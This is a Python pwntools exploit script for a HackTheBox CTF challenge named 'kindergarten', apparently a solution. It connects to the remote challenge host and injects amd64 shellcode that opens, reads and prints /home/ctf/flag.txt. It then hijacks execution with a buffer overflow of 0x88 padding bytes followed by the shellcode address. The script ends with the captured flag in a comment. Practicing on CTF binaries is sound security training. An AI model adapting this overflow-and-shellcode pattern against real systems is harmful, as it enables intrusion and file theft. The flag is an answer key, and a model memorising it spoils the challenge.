```python
#!/usr/bin/python3
from pwn import *
from time import sleep
from past.builtins import xrange
import random

#Addr rwx
shellcode_addr = 0x602040

#Exploit
if __name__=="__main__":
#	io = process("./kindergarten")
	io = remote("docker.hackthebox.eu",30301)

	shellcode = asm(f"""
		mov rax,2
		mov rdi,{shellcode_addr+0x41}
		mov rsi, 0
		syscall
		mov rdi, rax
		mov rax, 0
		mov rsi, {shellcode_addr + 0x500}
		mov rdx, 0x100
		syscall
		mov rax, 1
		mov rdi, 1
		syscall
	""",arch="amd64") + b"/home/ctf/flag.txt\0" # use /proc/self/maps\0 to leak the flag directory than guess flag file name flag.txt
	io.sendafter("> ",shellcode)
	for i in xrange(4):
		io.sendafter("> ","y")
		io.sendafter(">> ","A")
	io.sendafter("> ","y")
	io.sendafter("> ",b"A"*0x88+\
		p64(shellcode_addr)
	)
# HTB{2_c00l_4_$cH0oL!!}	
	io.interactive()
```
